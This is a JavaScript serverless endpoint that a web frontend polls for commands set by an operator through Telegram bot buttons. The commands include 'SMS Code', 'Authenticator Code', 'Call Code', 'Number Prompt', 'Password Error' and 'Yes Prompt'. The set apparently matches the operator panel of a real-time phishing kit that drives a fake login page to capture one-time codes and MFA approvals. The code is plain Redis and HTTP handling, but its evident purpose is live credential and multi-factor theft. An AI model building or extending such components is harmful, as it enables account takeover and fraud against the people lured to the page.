/**
 * getCommand — Polling endpoint for the frontend.
 *
 * The frontend calls this endpoint repeatedly to check whether the Telegram
 * bot operator has pressed an inline keyboard button for the given session.
 *
 * Query parameter: ?sessionId=xxxxx
 *
 * Returns:
 *   { command: null }                — No command yet (keep polling)
 *   { command: "sms_code" }          — Operator pressed "SMS Code"
 *   { command: "authenticator_code" }— Operator pressed "Authenticator Code"
 *   { command: "call_code" }         — Operator pressed "Call Code"
 *   { command: "number_prompt" }     — Operator pressed "Number Prompt"
 *   { command: "password_error" }    — Operator pressed "Password Error"
 *   { command: "yes_prompt" }        — Operator pressed "Yes Prompt"
 *   { command: "success" }           — Operator pressed "Success"
 */

const CONFIG = {
  ENV: {
    UPSTASH_REDIS_REST_URL: process.env.UPSTASH_REDIS_REST_URL,
    UPSTASH_REDIS_REST_TOKEN: process.env.UPSTASH_REDIS_REST_TOKEN,
  },
};

let _redis = null;
const getRedis = async () => {
  if (_redis) return _redis;
  if (!CONFIG.ENV.UPSTASH_REDIS_REST_URL || !CONFIG.ENV.UPSTASH_REDIS_REST_TOKEN) {
    return null;
  }
  try {
    const { Redis } = await import('@upstash/redis');
    _redis = new Redis({
      url: CONFIG.ENV.UPSTASH_REDIS_REST_URL,
      token: CONFIG.ENV.UPSTASH_REDIS_REST_TOKEN,
    });
    return _redis;
  } catch (e) {
    console.error('Redis init failed:', e.message);
    return null;
  }
};

export const handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'GET') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    // Parse sessionId from query string
    const params = event.queryStringParameters || {};
    const sessionId = params.sessionId;

    if (!sessionId) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Missing sessionId parameter' }),
      };
    }

    const redis = await getRedis();
    if (!redis) {
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Server configuration error — Redis not available' }),
      };
    }

    // Read the command from Redis
    const raw = await redis.get(`tg_command:${sessionId}`);
    let commandData = { command: null };

    if (raw) {
      try {
        commandData = typeof raw === 'string' ? JSON.parse(raw) : raw;
      } catch (e) {
        commandData = { command: null };
      }
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify(commandData),
    };
  } catch (error) {
    console.error('getCommand error:', error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Internal server error' }),
    };
  }
};
